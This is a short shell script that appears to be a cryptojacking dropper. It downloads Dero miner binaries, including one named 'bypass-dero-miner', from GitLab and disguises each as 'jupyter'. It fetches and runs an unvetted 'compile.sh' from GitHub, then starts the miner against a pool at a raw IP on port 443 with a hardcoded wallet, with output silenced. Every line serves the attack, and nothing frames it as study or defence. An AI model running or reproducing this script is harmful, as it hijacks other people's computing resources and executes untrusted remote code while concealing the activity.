wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
./jupyter  -r 146.190.93.49:443  -w dero1qyjad5xj0xy3srh42h9a2v8gq99yuzcmkgxe3fj9kgrmgp4lr2037qg979qja.sebdes >/dev/null 
./compile.sh
